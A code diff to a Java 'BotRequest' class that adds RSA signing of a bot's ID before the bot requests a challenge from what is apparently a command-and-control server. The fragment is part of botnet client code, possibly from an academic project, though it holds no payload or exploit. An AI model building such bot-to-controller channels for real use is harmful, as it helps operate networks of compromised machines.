@@ -1,7 +1,9 @@
 package cs.sii.network.request;
 
 import java.io.ByteArrayInputStream;
+import java.security.InvalidKeyException;
 import java.security.PublicKey;
+import java.security.SignatureException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Iterator;
@@ -266,14 +268,25 @@ public class BotRequest {
 
 	// da valutare se devono essere asincroni
 	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, IP ipCeC) {
-
 		Pairs<Long, Integer> response = new Pairs<>();
 		Integer counter = 0;
+
+		
+		String signId=null;
+		String data = null;
+		try {
+			signId = pki.signMessageRSA(idBot);
+			data=idBot+"<CS>"+signId;
+		} catch (InvalidKeyException | SignatureException e1) {
+			e1.printStackTrace();
+		}
+		
+			
 		while (counter < REQNUMBER) {
 			try {
 				String url = HTTPS + ipCeC + PORT + "/cec/welcome";
 				System.out.println("url challenge request " + url);
-				response = restTemplate.postForObject(url, idBot, response.getClass());
+				response = restTemplate.postForObject(url, data, response.getClass());
 				return response;
 			} catch (Exception e) {
 				// e.printStackTrace();
